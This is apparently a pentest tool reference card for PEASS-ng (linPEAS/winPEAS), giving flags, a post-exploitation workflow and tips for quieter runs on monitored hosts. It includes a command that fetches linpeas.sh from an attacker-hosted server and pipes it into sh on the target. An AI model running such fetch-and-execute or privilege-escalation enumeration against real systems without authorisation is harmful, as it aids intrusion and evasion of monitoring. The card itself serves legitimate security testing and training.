---
tool: PEASS-ng (linPEAS / winPEAS)
slug: peass
stages: [installation]
category: Privilege escalation enumeration
platforms: [linux, windows]
services: []
ports: []
tags: [privilege-escalation, enumeration, post-exploitation, local]
attack: [T1082, T1068, T1078]
summary: The privilege-escalation scouts. linPEAS and winPEAS enumerate a host for local privesc routes — weak permissions, stored credentials, misconfigured services, sudo and SUID, scheduled tasks — and colour-code the most promising findings. Run one the moment you land a shell.
references:
  - PEASS-ng GitHub | https://github.com/peass-ng/PEASS-ng
  - linPEAS | https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
---

## When to reach for it

You have a low-privileged shell and want the fastest map of local privilege-escalation routes. PEASS checks the hundreds of things you would otherwise check by hand and highlights the ones worth chasing. Run it, read the red/yellow, then verify by hand.

## Key flags

**linPEAS:**

- `-a` — all checks (thorough, slower).
- `-s` — stealth/quieter run.
- `-e` — extra/heavy enumeration.

**winPEAS:** choose the build (`winPEASx64.exe`, or the `.bat`); pass check groups like `systeminfo`, `userinfo`, `servicesinfo`, or `quiet` to trim output.

## Commands

Get linPEAS onto the target and run it (host it from your box, pull it on the target):

```bash
# on your machine
python3 -m http.server 8000
# on the target
curl http://10.10.14.5:8000/linpeas.sh | sh
```

Run it from disk and keep a log:

```bash
./linpeas.sh -a | tee linpeas.txt
```

winPEAS on a Windows foothold:

```text
C:\> winPEASx64.exe quiet servicesinfo userinfo > winpeas.txt
```

## Workflow

1. Land the shell and get a stable TTY first (PEASS output is long).
2. Transfer and run the right PEAS for the OS; save the output.
3. Read the highest-signal findings first (red/yellow): credentials, writable service binaries, sudo rules, SUID, cron/tasks.
4. Pick one route and verify it manually — PEASS flags candidates, it does not exploit.
5. Escalate, then re-run your enumeration as the new user.

## Notes

PEASS is noisy on disk and in logs; on a monitored host prefer the stealth options or targeted manual checks (`sudo -l`, `find / -perm -4000`, `schtasks`). It points at candidates — always confirm a finding is real before reporting it. Keep a copy of the output as evidence for the write-up.
